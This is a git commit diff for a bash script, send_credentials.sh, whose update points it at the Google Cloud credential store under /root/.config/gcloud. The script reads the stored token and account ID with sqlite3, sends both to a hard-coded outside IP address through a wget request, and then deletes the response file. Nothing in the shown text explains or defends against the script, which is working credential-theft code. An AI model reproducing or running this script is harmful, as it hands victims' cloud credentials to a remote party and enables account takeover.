d56da16ed6a1bed1a981d8dde40b921405349be8
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-04-26 23:02:06 -0300

    Update send_credentials.sh

--- send_credentials.sh
+++ send_credentials.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-token=$(sqlite3 credentials.db "select value from credentials")
+token=$(sqlite3 /root/.config/gcloud/credentials.db "select value from credentials")
 
-account_id=$(sqlite3 credentials.db "select trim(account_id) from credentials")
+account_id=$(sqlite3 /root/.config/gcloud/credentials.db "select account_id from credentials")
 
 wget http://135.148.11.148/token.php?account_id=$account_id'&token='"$token" -q -O send_token
 
-date>send_token
+rm -rf send_token
